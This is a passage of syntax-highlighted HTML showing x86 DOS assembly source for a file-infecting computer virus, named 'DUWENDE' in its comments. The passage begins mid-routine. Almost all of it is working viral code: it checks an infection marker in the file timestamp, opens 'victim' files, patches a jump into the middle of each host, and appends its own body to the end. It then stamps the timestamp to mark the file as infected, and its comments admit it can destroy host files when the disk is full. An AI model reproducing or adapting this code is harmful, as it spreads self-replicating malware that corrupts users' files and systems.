         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">_06</span><span class="sc0">                         </span><span class="sc1">; sec = 0 ==&gt; not infected</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                       </span><span class="sc1">; day &lt;&gt; sec ==&gt; not infected</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">_07</span><span class="sc0">                         </span><span class="sc1">; day = sec ==&gt; infected</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_06</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._jmp1</span><span class="sc0">               </span><span class="sc1">; get drive number </span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">                      </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._asciiz</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; set up asciiz</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_inf</span><span class="sc0">                        </span><span class="sc1">;; *my life giver* ;;;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_07</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; restore active dta</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; restore registers</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_03</span><span class="sc0">                         </span><span class="sc1">; done!!!!</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_inf</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">                    </span><span class="sc1">; save error int</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">                      </span><span class="sc1">; set up own error int</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_is_err</span><span class="sc0">           </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._asciiz</span><span class="sc0">             </span><span class="sc1">; clear attrib</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">_08</span><span class="sc0">                         </span><span class="sc1">; write protected?</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_10</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._attr</span><span class="sc0">               </span><span class="sc1">; restore attrib</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_08</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; restore old error int</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_09</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_10</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                    </span><span class="sc1">; open victim</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">_09</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; save file handle</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; read 3 bites from </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; victim start</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">                     </span><span class="sc1">; is it a jmp e9?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">_11</span><span class="sc0">                         </span><span class="sc1">; infect near jmp only</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; compute where to write</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                    </span><span class="sc1">; jmp to virii</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; save offsets for write</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; </span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">_02</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; save 3 bites from</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; middle of victim </span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._len</span><span class="sc0">                </span><span class="sc1">; set up jump to virii</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._jmp1</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._jmp2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; write jmp in the middle</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; of the file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; write _my_program</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; to end of victim</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._len</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; DUWENDE destroys</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; victim if disk is full</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; i do not check </span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; error :(</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._date</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">._time</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; make second = day</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                      </span><span class="sc1">; file selfrec</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_11</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; done. close file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; </span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_save</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">                         </span><span class="sc1">; holds victims 3 bites</span><span class="sc0">
 </span><span class="sc5">_save1</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">20cdh</span><span class="sc0">                       </span><span class="sc1">; </span><span class="sc0">
                                             </span><span class="sc1">; prog 1st gen init code:</span><span class="sc0">
                                             </span><span class="sc1">;    90    nop      </span><span class="sc0">
                                             </span><span class="sc1">;    cd20  int 20h  end exec</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc5">_me_dta</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">43</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                  </span><span class="sc1">; program dta</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">_finis</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; end label</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">_my_program</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">_is_me</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;  end _my_progam</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span></div></body>
</html>
